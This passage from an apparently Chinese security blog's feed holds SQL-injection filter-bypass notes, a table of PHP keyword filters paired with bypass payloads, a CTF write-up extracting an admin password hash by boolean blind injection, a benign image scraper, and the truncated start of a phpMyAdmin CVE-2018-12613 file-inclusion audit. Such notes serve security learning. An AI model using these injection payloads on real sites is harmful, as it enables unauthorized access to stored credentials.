class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. 通过greatest函数绕过不能使用大小于符号的情况</span><br><span class="line"></span><br><span class="line">greatest(a,b)，返回a和b中较大的那个数。</span><br><span class="line">当我们要猜解user()第一个字符的ascii码是否小于等于150时，可使用：</span><br><span class="line">mysql&gt; select greatest(ascii(mid(user(),1,1)),150)&#x3D;150;</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">| greatest(ascii(mid(user(),1,1)),150)&#x3D;150 |</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">|                                        1 |</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">如果小于150，则上述返回值为True。</span><br><span class="line"></span><br><span class="line">2. 通过substr函数绕过不能使用逗号的情况</span><br><span class="line"></span><br><span class="line">mid(user() from 1 for 1)</span><br><span class="line">或</span><br><span class="line">substr(user() from 1 for 1)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ascii(substr(user() from 1 for 1)) &lt; 150;</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">| ascii(substr(user() from 1 for 1)) &lt; 150 |</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">|                                        1 |</span><br><span class="line"> +------------------------------------------+</span><br><span class="line"></span><br><span class="line">3.使用数学运算函数在子查询中报错</span><br><span class="line"></span><br><span class="line">exp(x)函数的作用： 取常数e的x次方，其中，e是自然对数的底。</span><br><span class="line"></span><br><span class="line">~x 是一个一元运算符，将x按位取补</span><br><span class="line"></span><br><span class="line">select exp(~(select*from(select user())a))</span><br><span class="line">mysql报错：</span><br><span class="line">mysql&gt; select exp(~(select*from(select user())a));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(~((select ‘root@localhost’ from dual)))’</span><br><span class="line"></span><br><span class="line">这条查询会出错，是因为exp(x)的参数x过大，超过了数值范围，分解到子查询，就是：</span><br><span class="line"></span><br><span class="line">(select*from(select user())a) 得到字符串 root@localhost</span><br><span class="line"></span><br><span class="line">表达式’root@localhost’被转换为0，按位取补之后得到一个非常的大数，它是MySQL中最大的无符号整数</span><br></pre></td></tr></table></figure><h4 id="PHP一些常见的过滤方法及绕过方式"><a href="#PHP一些常见的过滤方法及绕过方式" class="headerlink" title="PHP一些常见的过滤方法及绕过方式"></a>PHP一些常见的过滤方法及绕过方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">过滤关键字    and or</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 or 1&#x3D;1 1 and 1&#x3D;1</span><br><span class="line">绕过方式    1 || 1&#x3D;1 1 &amp;&amp; 1&#x3D;1</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    union select user,password from users</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users where userid&#x3D;1)&#x3D;&#39;admin&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users group by user_id having user_id &#x3D; 1) &#x3D; &#39;admin&#39;#user_id聚合中user_id为1的user为admin</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users group by user_id having user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) &#x3D; 1</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class="line">绕过方式    1 &amp;&amp; substr(user,1,1) &#x3D; &#39;a&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class="line">绕过方式    1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) &#x3D; 0x61 1 &amp;&amp; substr(user,1,1) &#x3D; unhex(61)</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;, hex</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) &#x3D; unhex(61)</span><br><span class="line">绕过方式    1 &amp;&amp; substr(user,1,1) &#x3D; lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;, hex, substr</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex|substr)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) &#x3D; lower(conv(11,10,16))&#x2F;td&gt;</span><br><span class="line">绕过方式    1 &amp;&amp; lpad(user,7,1)</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;, hex, substr, 空格</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex|substr|\s)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; lpad(user,7,1)&#x2F;td&gt;</span><br><span class="line">绕过方式    1%0b||%0blpad(user,7,1)</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 || (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 || (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;0x01-数据库特性&quot;&gt;&lt;a href=&quot;#0x01-数据库特性&quot; class=&quot;headerlink&quot; title=&quot;0x01 数据库特性&quot;&gt;&lt;/a&gt;0x01 数据库特性&lt;/h3&gt;&lt;h4 id=&quot;注释&quot;&gt;&lt;a href=&quot;#注释&quot; class=&quot;headerlink&quot; title=&quot;注释&quot;&gt;&lt;/a&gt;注释&lt;/h4&gt;&lt;p&gt;常见的注释符号：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;#，--空格，-- -，--+，&amp;#x2F;&amp;#x2F;，&amp;#x2F;**&amp;#x2F;，&amp;#x2F;*任意字符串*&amp;#x2F;，;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;一般是使用/**/来绕过过滤空格。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;select * from users where id&amp;#x3D;1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;select&amp;#x2F;**&amp;#x2F;*&amp;#x2F;**&amp;#x2F;from&amp;#x2F;**&amp;#x2F;users&amp;#x2F;*111*&amp;#x2F;where&amp;#x2F;**&amp;#x2F;id&amp;#x3D;1;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上面两条语句执行结果是一样的。&lt;/p&gt;
&lt;img src=&quot;/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/1.png&quot; class title=&quot;This is an test image&quot;&gt;
&lt;p&gt;需要注意的是：虽然#，–空格 – - –+都是注释符，但是在不同网站对它们的解析不同。&lt;/p&gt;
&lt;img src=&quot;/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/2.png&quot; class title=&quot;This is an test image&quot;&gt;
&lt;p&gt;这个时候就需要我们多加测试，看看哪种注释符可以被网站的数据库解析执行。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入Fuzz记录</title>
    <link href="https://da4er.top/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95.html"/>
    <id>https://da4er.top/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95.html</id>
    <published>2020-02-24T14:34:23.000Z</published>
    <updated>2020-02-24T14:38:23.366Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>从今天开始学习各种fuzz测试，今天做了一道sql注入题，通过fuzz来判断过滤字符，从而构造payload进行绕过。</p><hr><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>拿到题目进行简单的测试</p><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/1.png" class title="This is an test image"><p>发现这题进行了一些sql关键字的过滤，我们通过burp的Intruder模块进行fuzz。</p><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/2.png" class title="This is an test image"><p>字段长度为370的是被过滤的sql语句。<br><strong>进一步分析看看这题目到底过滤了哪些关键字，通过一个个分析知道过滤了：# –+等注释符，空格，%0a,%0b等绕过过滤空格的url编码，逗号(,)，包含and和or的字符。还有很多绕过过滤的关键字，发现没有过滤sleep()，尝试一下时间盲注。</strong><br>常规的时间盲注为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(条件,sleep(3),2)</span><br></pre></td></tr></table></figure><p>但是题目过滤了逗号，想到用case when替换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">case when 条件 then sleep(2) else 1 end</span><br></pre></td></tr></table></figure><p>但是过滤了空格等分隔符，同时内联注释 注释符 %0a %0b %0d %a0也多被过滤，我们可以用括号来代替空格：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">case when(条件)then(sleep(2))else(1)end</span><br></pre></td></tr></table></figure><p>但是测试发现case和when中间是不能添加括号的，到这里时间盲注也是不可行的。</p><p>可以尝试另类的布尔盲注:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;admin&#39;&#x3D;&#39;admin&#39;+1 union select &#39;admin&#39;&#x3D;&#39;admin&#39;+0;</span><br></pre></td></tr></table></figure><p>在本地测试发现，第一个输出0，第二个输出1。</p><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/3.png" class title="This is an test image"><p>这是mysql的一个特性：<strong>在第一个查询中，先进行右边的’admin’+1操作，这个时候会强制转换admin为数字，然后相加完在和等号左边的admin比较，这个时候也会强制转换，所以就会形成不相等的情况。</strong><br>上面就可以形成布尔逻辑判断了。<br>首先我们可以先判断一些admin账号的密码长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;%2b(length(passwd)&#x3D;32)%2b&#39;</span><br></pre></td></tr></table></figure><p>%2b是+号，不能直接使用加号因为被过滤了，这里也可以使用-号，效果相同。<br>上面的逻辑是：如果passwd长度为32，则返回1，然后和admin作相加操作，这样就会形成逻辑上的差别。如下图：</p><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/4.png" class title="This is an test image"><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/5.png" class title="This is an test image"><p>这样就可以判断admin的密码是个32为的md5值。<br>然后在猜解每个字符，通过mid函数进行：<strong>但for被过滤！</strong><br>mid(xxx from 1)  第一位开始取剩下的所有字符<br><strong>ascii(mid(xxx from 1)) 发现截断 取第一个字符的ascii值。</strong><br>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;%2b(ascii(mid((passwd)from(1)))&#x3D;48)%2b&#39;</span><br></pre></td></tr></table></figure><p>通过括号绕过空格过滤，通过mysql中的mid，ascii函数特性绕过for过滤。<br>最后通过burp爆破每一位的ascii值，就可以得到密码的md5值了。</p><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/6.png" class title="This is an test image">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;从今天开始学习各
      
    
    </summary>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>多线程爬取表情包</title>
    <link href="https://da4er.top/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%8F%96%E8%A1%A8%E6%83%85%E5%8C%85.html"/>
    <id>https://da4er.top/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%8F%96%E8%A1%A8%E6%83%85%E5%8C%85.html</id>
    <published>2020-02-23T11:01:54.000Z</published>
    <updated>2020-02-23T11:02:20.841Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><p><strong>通过threading库加上queue的安全队列进行了一次对表情包网的爬出。</strong><br>代码如下：<br>使用了消费者和生产者的多线程爬虫。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line">from urllib import request</span><br><span class="line">import requests</span><br><span class="line">from lxml import etree</span><br><span class="line">class Producer(threading.Thread):</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.87 Safari&#x2F;537.36&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    def __init__ (self, page_queue,  img_queue, *args, **kwargs):</span><br><span class="line">        super(Producer, self).__init__(*args, **kwargs)</span><br><span class="line">        self.page_queue &#x3D; page_queue</span><br><span class="line">        self.image_queue &#x3D; img_queue</span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            if self.page_queue.empty():</span><br><span class="line">                break</span><br><span class="line">            url &#x3D; self.page_queue.get()</span><br><span class="line">            self.spider(url)</span><br><span class="line">    def spider(self, url):</span><br><span class="line">        resp &#x3D; requests.get(url, headers&#x3D;self.headers)</span><br><span class="line">        text &#x3D; resp.text</span><br><span class="line">        html &#x3D; etree.HTML(text)</span><br><span class="line">        imgs &#x3D; html.xpath(&quot;&#x2F;&#x2F;div[@class&#x3D;&#39;page-content text-center&#39;]&#x2F;&#x2F;img[@class!&#x3D;&#39;gif&#39;]&quot;)</span><br><span class="line">        for i in imgs:</span><br><span class="line">            img &#x3D; i.get(&#39;data-original&#39;)</span><br><span class="line">            suffix &#x3D; os.path.splitext(img)[1]</span><br><span class="line">            alt &#x3D; i.get(&#39;alt&#39;)</span><br><span class="line">            alt &#x3D; re.sub(r&#39;[\?\.？。，,!！\*]&#39;, &#39;&#39;, alt)</span><br><span class="line">            filename &#x3D; alt + suffix</span><br><span class="line">            print(&#39;&#x2F;images&#x2F;%s&#39; %filename)</span><br><span class="line">            self.image_queue.put((img, filename))</span><br><span class="line">class Consumer(threading.Thread):</span><br><span class="line">    def __init__(self,page_queue,img_queue,*args,**kwargs):</span><br><span class="line">        super(Consumer, self).__init__(*args, **kwargs)</span><br><span class="line">        self.page_queue &#x3D; page_queue</span><br><span class="line">        self.img_queue &#x3D; img_queue</span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            if self.page_queue.empty() and self.img_queue.empty():</span><br><span class="line">                break</span><br><span class="line">            img_url,filename&#x3D;self.img_queue.get()</span><br><span class="line">            request.urlretrieve(img_url,&quot;images&#x2F;&quot;+filename)</span><br><span class="line">            print(filename+&quot;  下载完成！&quot;)</span><br><span class="line">def main():</span><br><span class="line">    page_queue &#x3D; Queue(100)</span><br><span class="line">    img_queue &#x3D; Queue(1000)</span><br><span class="line">    base_url &#x3D; &quot;http:&#x2F;&#x2F;www.doutula.com&#x2F;photo&#x2F;list&#x2F;?page&#x3D;&#123;&#125;&quot;</span><br><span class="line">    for i in range(1, 101):</span><br><span class="line">        url &#x3D; base_url.format(i)</span><br><span class="line">        page_queue.put(url)</span><br><span class="line">    for i in range(5):</span><br><span class="line">        t&#x3D;Producer(page_queue,img_queue)</span><br><span class="line">        t.start()</span><br><span class="line">    for i in  range(5):</span><br><span class="line">        t&#x3D;Consumer(page_queue,img_queue)</span><br><span class="line">        t.start()</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;p&gt;&lt;strong&gt;通过threading库加上queue的安全队列进行了一次对表情包网的爬出。&lt;/strong&gt;&lt;br&gt;代码如下：&lt;br&gt;使用了消费者和
      
    
    </summary>
    
    
      <category term="爬虫" scheme="https://da4er.top/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://da4er.top/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>代码审计_phpmyadmin4.8.1后台文件包含漏洞(CVE-2018-12613)</title>
    <link href="https://da4er.top/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-phpmyadmin4-8-1%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613.html"/>
    <id>https://da4er.top/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-phpmyadmin4-8-1%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613.html</id>
    <published>2020-02-17T13:46:13.000Z</published>
    <updated>2020-02-17T13:47:27.265Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><p>漏洞影响范围：phpmyadmin4.8.0 4.8.1<br>漏洞类型：后台任意文件包含<br><a href="https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip">下载地址</a></p><p>漏洞出现在index.php页面中的55~63行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (! empty($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! preg_match(&#39;&#x2F;^index&#x2F;&#39;, $_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])</span><br><span class="line">) &#123;</span><br><span class="line">    include $_REQUEST[&#39;target&#39;];</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看这个段代码的逻辑：传入的target参数不为空；target是字符串类型；target不易index开头；target不在$target_blacklist中；checkPageValidity($_REQUEST[‘target’]返回true。</p><p>看一下$target_blacklist：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist &#x3D; array (</span><br><span class="line">    &#39;import.php&#39;, &#39;export.php&#39;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>追踪一下checkPageValidity函数：在/libraries/classes/Core.php中找到，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public static function checkPageValidity(&amp;$page, array </span><br><span class="line">$whitelist &#x3D; [])</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">       if (empty($whitelist)) &#123;</span><br><span class="line">            $whitelist &#x3D; self::$goto_whitelist;</span><br><span class="line">        &#125;</span><br><span class="line">       if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (in_array($page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">           $page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        $_page &#x3D; urldecode($page);</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>看见这个函数需要两个参数，如果whitelist参数为空，会使用代码提供的白名单数组，追踪一下这个数组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 